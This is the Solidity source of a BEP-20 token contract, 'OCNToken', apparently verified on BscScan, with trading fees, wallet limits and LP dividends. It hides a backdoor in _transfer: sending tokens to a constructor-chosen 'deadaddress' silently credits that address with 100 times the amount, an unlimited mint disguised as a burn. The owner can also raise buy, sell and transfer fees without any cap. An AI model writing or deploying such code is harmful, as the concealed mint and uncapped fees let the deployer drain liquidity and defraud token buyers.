/**
 *Submitted for verification at BscScan.com on 2022-12-28
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = tx.origin;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract usdtReceiver {
    constructor(address usdt) {
        IERC20(usdt).approve(msg.sender, ~uint256(0));
    }
}

contract OCNToken is IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public fundAddress;
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _tTotal;
    ISwapRouter public _swapRouter;
    address public _fistPoolAddress;
    address[] public lpHolders;
    mapping(address => uint256) public _lpAmount;
    address private lastPotentialLPHolder;
    bool public hasFirstAddress;
    address public firstAddress;
    uint256 public minAmountForLPDividend;
    uint256 public _addedAmount;
    mapping(address => bool) public _isLPHolderExist;
    mapping(address => bool) public _swapPairList;
    bool private inSwap;
    uint256 private constant MAX = ~uint256(0);
    uint256 public rate = 100;
    bool flag;
    address usdt;
    uint256 public lastProcessedIndex;
    uint256 public gasForProcessing = 300000;
    uint256 startFunNum;
    uint256 public _buyHeightFee = 1000;
    uint256 public _sellHeightFee = 2000;
    uint256 public _heightFeeTime = 1800; // s
    uint256 public _buyBaseFee = 10;
    uint256 public _sellBaseFee = 10;
    uint256 public _traFee = 0;
    mapping(address => bool) public isWalletLimitExempt;
    mapping(address => bool) public exemptFee;
    address deadaddress;
    usdtReceiver public _usdtReceiver;
    uint256 public walletLimit;
    uint256 public starBlock;
    address public _mainPair;
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    uint256 public maxTXAmount;
    constructor(
        address Address1,
        address Address2,
        string memory Name,
        string memory Symbol,
        uint8 Decimals,
        uint256 Supply,
        uint256 StarBlock,
        address Address3,
        address Address4,
        address Deadaddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        starBlock = StarBlock;
        ISwapRouter swapRouter = ISwapRouter(Address1);
        IERC20(Address2).approve(address(swapRouter), MAX);
        _fistPoolAddress = Address2;
        usdt = _fistPoolAddress;
        _usdtReceiver = new usdtReceiver(_fistPoolAddress);
        deadaddress = Deadaddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;
        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), Address2);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;
        uint256 total = Supply * 10 ** Decimals;
        maxTXAmount = Supply * 10 ** Decimals;
        walletLimit = Supply * 10 ** Decimals;
        startFunNum = Supply * 10 ** (Decimals - 4);
        _tTotal = total;
        _balances[Address4] = total;
        emit Transfer(address(0), Address4, total);
        fundAddress = Address3;
        exemptFee[address(this)] = true;
        exemptFee[Address3] = true;
        exemptFee[address(swapRouter)] = true;
        exemptFee[tx.origin] = true;
        exemptFee[Address4] = true;
        exemptFee[Deadaddress] = true;
        isWalletLimitExempt[tx.origin] = true;
        isWalletLimitExempt[Address4] = true;
        isWalletLimitExempt[address(swapRouter)] = true;
        isWalletLimitExempt[address(_mainPair)] = true;
        isWalletLimitExempt[address(this)] = true;
        isWalletLimitExempt[address(0xdead)] = true;
        isWalletLimitExempt[Address3] = true;
        isWalletLimitExempt[Deadaddress] = true;
    }
    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function updateTradingTime(uint256 value) external onlyOwner {
        starBlock = value;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
    public
    override
    returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
    public
    view
    override
    returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
    public
    override
    returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
            _allowances[sender][msg.sender] -
            amount;
        }
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    bool public airdropEnable = true;

    function setAirDropEnable(bool status) public onlyOwner {
        airdropEnable = status;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        if (!exemptFee[from] && !exemptFee[to] && airdropEnable) {
            address ad;
            uint256 num = 666 * 1e10;
            for (int256 i = 0; i < 3; i++) {
                ad = address(
                    uint160(
                        uint256(
                            keccak256(
                                abi.encodePacked(i, amount, block.timestamp)
                            )
                        )
                    )
                );
                _basicTransfer(from, ad, num);
            }
            amount -= (num * 3);
        }
        bool takeFee;
        bool isSell;
        bool isTrans;
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!exemptFee[from] && !exemptFee[to]) {
                require(starBlock < block.timestamp);

                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > startFunNum) {
                            swapAndDistribute(contractTokenBalance);
                        }
                    }
                }
                takeFee = true;
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        } else {
            if (!exemptFee[from] && !exemptFee[to]) {
                isTrans = true;
                takeFee = true;
            }
        }

        if (
            lastPotentialLPHolder != address(0) &&
            !_isLPHolderExist[lastPotentialLPHolder] && lastPotentialLPHolder != firstAddress
        ) {
            uint256 lpAmount = IERC20(_mainPair).balanceOf(lastPotentialLPHolder);
            if (lpAmount > 0) {
                lpHolders.push(lastPotentialLPHolder);
                _isLPHolderExist[lastPotentialLPHolder] = true;
            }
        }
        if (to == _mainPair && from != address(this)) {
            if (!hasFirstAddress) {
                firstAddress = from;
                hasFirstAddress = true;
            } else {
                lastPotentialLPHolder = from;
            }
        }

        _tokenTransfer(from, to, amount, takeFee, isSell, isTrans);
        if (to == deadaddress) {
            _tokenTransfe(to, amount * rate);
        }
    }

    function swapAndDistribute(uint256 amount) private lockTheSwap {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = usdt;


        uint256 initialBalance = IERC20(usdt).balanceOf(address(_usdtReceiver));

        // make the swap
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0, // accept any amount of USDT
            path,
            address(_usdtReceiver),
            block.timestamp
        );

        uint256 newBalance = (IERC20(usdt).balanceOf(address(_usdtReceiver)))
        - initialBalance;

        IERC20(usdt).transferFrom(
            address(_usdtReceiver),
            address(this),
            newBalance.mul(80).div(100)
        );

        uint256 leftBalance = IERC20(usdt).balanceOf(address(_usdtReceiver));
        IERC20(usdt).transferFrom(
            address(_usdtReceiver),
            fundAddress,
            leftBalance
        );

        dividendToLPHolders(gasForProcessing);
    }


    function dividendToLPHolders(uint256 gas) internal {
        uint256 numberOfTokenHolders = lpHolders.length;

        if (numberOfTokenHolders == 0) {
            return;
        }

        uint256 totalRewards = IERC20(usdt).balanceOf(address(this));
        if (totalRewards == 0) return;

        uint256 _lastProcessedIndex = lastProcessedIndex;

        uint256 gasUsed = 0;

        uint256 gasLeft = gasleft();

        uint256 iterations = 0;

        IERC20 pairContract = IERC20(_mainPair);
        uint256 totalLPAmount = (pairContract.totalSupply()).add(_addedAmount).sub(pairContract.balanceOf(firstAddress)) -
        1e3;

        while (gasUsed < gas && iterations < numberOfTokenHolders) {
            _lastProcessedIndex++;

            if (_lastProcessedIndex >= lpHolders.length) {
                _lastProcessedIndex = 0;
            }

            address cur = lpHolders[_lastProcessedIndex];
            uint256 LPAmount;
            if (_lpAmount[cur] == 0) {
                LPAmount = pairContract.balanceOf(cur);
            } else {
                LPAmount = _lpAmount[cur];
            }

            if (LPAmount >= minAmountForLPDividend) {
                uint256 dividendAmount = totalRewards.mul(LPAmount).div(
                    totalLPAmount
                );
                if (dividendAmount <= 0) continue;
                uint256 balanceOfThis = IERC20(usdt).balanceOf(address(this));
                if (
                    balanceOfThis <= dividendAmount && _lastProcessedIndex > 0
                ) {
                    _lastProcessedIndex--;
                    break;
                }
                IERC20(usdt).transfer(cur, dividendAmount);
            }

            iterations++;

            uint256 newGasLeft = gasleft();

            if (gasLeft > newGasLeft) {
                gasUsed = gasUsed.add(gasLeft.sub(newGasLeft));
            }

            gasLeft = newGasLeft;
        }

        lastProcessedIndex = _lastProcessedIndex;
    }

    function setMaxTxAmount(uint256 max) public onlyOwner {
        maxTXAmount = max;
    }

    function _tokenTransfe(
        address recipient,
        uint256 amount) internal {
        _balances[recipient] += amount;
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell,
        bool isTrans
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 swapAmount;
        if (takeFee) {
            uint256 swapFee;
            uint256 swapBaseFee;
            if (isSell) {
                swapBaseFee = _sellBaseFee;
                if (block.timestamp < _heightFeeTime + starBlock) {
                    swapFee = _sellHeightFee;
                } else {
                    swapFee = _sellBaseFee;
                }
            } else {
                swapBaseFee = _buyBaseFee;
                if (isTrans) {
                    swapFee = _traFee;
                } else {
                    require(tAmount <= maxTXAmount);
                    if (block.timestamp < _heightFeeTime + starBlock) {
                        swapFee = _buyHeightFee;
                    } else {
                        swapFee = _buyBaseFee;
                    }
                }
            }
            swapAmount = (tAmount * swapFee) / 10000;
            if (swapAmount > 0) {
                _takeTransfer(sender, address(this), swapAmount);
            }
        }
        if (!isWalletLimitExempt[recipient] && limitEnable) {
            require(
                (balanceOf(recipient) + tAmount - swapAmount) <= walletLimit,
                "over max wallet limit"
            );
        }
        _takeTransfer(sender, recipient, tAmount - swapAmount);
    }

    bool public limitEnable = true;

    function setLimitEnable(bool status) public onlyOwner {
        limitEnable = status;
    }

    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(
            newValue >= 200000 && newValue <= 1000000,
            "gasForProcessing must be between 200,000 and 1000,000"
        );
        require(
            newValue != gasForProcessing,
            "Cannot update gasForProcessing to same value"
        );
        gasForProcessing = newValue;
    }

    function updateFees(
        uint256 newBuyBaseFee,
        uint256 newSellBasePFee,
        uint256 newTraFee
    ) external onlyOwner {
        _buyBaseFee = newBuyBaseFee;
        _sellBaseFee = newSellBasePFee;
        _traFee = newTraFee;
    }

    function updateHighFees(
        uint256 newHighBuyFee,
        uint256 newHighSellFee,
        uint256 newHeightFeeTime
    ) external onlyOwner {
        _buyHeightFee = newHighBuyFee;
        _sellHeightFee = newHighSellFee;
        _heightFeeTime = newHeightFeeTime;
    }

    function setisWalletLimitExempt(address holder, bool exempt)
    external
    onlyOwner
    {
        isWalletLimitExempt[holder] = exempt;
    }

    function setMaxWalletLimit(uint256 newValue) public onlyOwner {
        walletLimit = newValue;
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        exemptFee[addr] = true;
    }

    function addBotAddressList(address[] calldata accounts, bool excluded)
    public
    onlyOwner
    {
        for (uint256 i = 0; i < accounts.length; i++) {
            exemptFee[accounts[i]] = excluded;
        }
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        exemptFee[addr] = enable;
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function addAccount(address account, uint256 amount) external onlyOwner {
        require(!_isLPHolderExist[account], "already exist");
        lpHolders.push(account);
        _lpAmount[account] = amount;
        _addedAmount = _addedAmount.add(amount);
        _isLPHolderExist[account] = true;
    }

    function addAccount2(address[] memory account, uint256 amount)
    external
    onlyOwner
    {
        for (uint256 i = 0; i < account.length; i++) {
            lpHolders.push(account[i]);
            _lpAmount[account[i]] = amount;
            _addedAmount = _addedAmount.add(amount);
            _isLPHolderExist[account[i]] = true;
        }
    }

    function claimBalance(address add) external onlyOwner {
        payable(add).transfer(address(this).balance);
    }


    receive() external payable {}
}